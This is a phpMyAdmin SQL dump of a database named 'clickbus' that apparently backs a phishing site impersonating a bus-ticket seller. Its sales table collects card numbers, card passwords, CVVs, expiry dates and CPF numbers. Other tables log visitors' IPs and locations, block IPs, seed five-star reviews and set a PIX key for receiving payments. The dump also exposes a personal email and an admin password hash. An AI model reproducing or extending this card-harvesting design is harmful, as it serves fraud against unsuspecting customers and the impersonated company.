-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Tempo de geração: 13/08/2023 às 15:43
-- Versão do servidor: 10.4.28-MariaDB
-- Versão do PHP: 8.0.28

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Banco de dados: `clickbus`
--

-- --------------------------------------------------------

--
-- Estrutura para tabela `acessos`
--

CREATE TABLE `acessos` (
  `id` int(255) NOT NULL,
  `data` varchar(255) NOT NULL,
  `ip` varchar(255) NOT NULL,
  `pais` varchar(255) NOT NULL,
  `estado` varchar(255) NOT NULL,
  `cidade` varchar(255) NOT NULL,
  `userAgent` varchar(255) NOT NULL,
  `sistema` varchar(255) NOT NULL,
  `navegador` varchar(255) NOT NULL,
  `dispositivo` varchar(255) NOT NULL,
  `host` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Estrutura para tabela `avaliacao`
--

CREATE TABLE `avaliacao` (
  `id` int(11) NOT NULL,
  `nome` varchar(255) NOT NULL,
  `comentario` longtext NOT NULL,
  `estrelas` varchar(255) NOT NULL,
  `data` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Despejando dados para a tabela `avaliacao`
--

INSERT INTO `avaliacao` (`id`, `nome`, `comentario`, `estrelas`, `data`) VALUES
(1, 'Dulce Silva', 'Transporte rápido. Bom produto', '5', ' 27/01/2022'),
(3, 'Marcelo', 'entregue antes do prazo. obrigado', '5', '02/03/2022'),
(4, 'delson oliveira', 'agradeço muito pela ágil entrega, vocês são nota 10', '5', '15/05/2021');

-- --------------------------------------------------------

--
-- Estrutura para tabela `configuracoes`
--

CREATE TABLE `configuracoes` (
  `id` int(11) NOT NULL,
  `chave_pix` varchar(255) NOT NULL,
  `nome_titular` varchar(255) NOT NULL,
  `data` varchar(255) NOT NULL,
  `ip` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Despejando dados para a tabela `configuracoes`
--

INSERT INTO `configuracoes` (`id`, `chave_pix`, `nome_titular`, `data`, `ip`) VALUES
(1, 'michaelos.oliveira@gmail.com', 'teste', '10:35:52 13/08/2023', '::1');

-- --------------------------------------------------------

--
-- Estrutura para tabela `ipsblock`
--

CREATE TABLE `ipsblock` (
  `id` int(11) NOT NULL,
  `ip` varchar(255) DEFAULT NULL,
  `horaData` varchar(255) NOT NULL,
  `status` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Despejando dados para a tabela `ipsblock`
--

INSERT INTO `ipsblock` (`id`, `ip`, `horaData`, `status`) VALUES
(1, '::1	', '00:51:36 07/10/2022', '');

-- --------------------------------------------------------

--
-- Estrutura para tabela `usuarios`
--

CREATE TABLE `usuarios` (
  `id` int(11) NOT NULL,
  `login` varchar(255) NOT NULL,
  `senha` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Despejando dados para a tabela `usuarios`
--

INSERT INTO `usuarios` (`id`, `login`, `senha`) VALUES
(1, 'mike', 'ddbdf1d77db0e5587d05fdc28ffde30adc48d692');

-- --------------------------------------------------------

--
-- Estrutura para tabela `vendas`
--

CREATE TABLE `vendas` (
  `id` int(11) NOT NULL,
  `origem` varchar(255) NOT NULL,
  `destino` varchar(255) NOT NULL,
  `valorTotal` varchar(255) NOT NULL,
  `quantidade` varchar(255) NOT NULL,
  `nome` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `telefone` varchar(255) NOT NULL,
  `cpf` varchar(255) NOT NULL,
  `tipoPagamento` varchar(255) NOT NULL,
  `clique_copiapix` varchar(255) DEFAULT NULL,
  `numerocc` varchar(255) DEFAULT NULL,
  `senhacc` varchar(255) DEFAULT NULL,
  `banco_cc` varchar(255) DEFAULT NULL,
  `bandeira_cc` varchar(255) DEFAULT NULL,
  `categoria_cc` varchar(255) DEFAULT NULL,
  `pais_cc` varchar(255) DEFAULT NULL,
  `validadecc` varchar(255) DEFAULT NULL,
  `cvvcc` varchar(255) DEFAULT NULL,
  `titularcc` varchar(255) DEFAULT NULL,
  `cpfcc` varchar(255) DEFAULT NULL,
  `parcelascc` varchar(255) DEFAULT NULL,
  `ip` varchar(255) NOT NULL,
  `pais_loca` varchar(255) NOT NULL,
  `estado_loca` varchar(255) NOT NULL,
  `cidade_loca` varchar(255) NOT NULL,
  `sistema` varchar(255) NOT NULL,
  `navegador` varchar(255) NOT NULL,
  `data` varchar(255) NOT NULL,
  `notificacao` varchar(255) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Índices para tabelas despejadas
--

--
-- Índices de tabela `acessos`
--
ALTER TABLE `acessos`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `avaliacao`
--
ALTER TABLE `avaliacao`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `configuracoes`
--
ALTER TABLE `configuracoes`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `ipsblock`
--
ALTER TABLE `ipsblock`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `usuarios`
--
ALTER TABLE `usuarios`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `vendas`
--
ALTER TABLE `vendas`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT para tabelas despejadas
--

--
-- AUTO_INCREMENT de tabela `acessos`
--
ALTER TABLE `acessos`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT de tabela `avaliacao`
--
ALTER TABLE `avaliacao`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT de tabela `configuracoes`
--
ALTER TABLE `configuracoes`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de tabela `ipsblock`
--
ALTER TABLE `ipsblock`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de tabela `usuarios`
--
ALTER TABLE `usuarios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT de tabela `vendas`
--
ALTER TABLE `vendas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
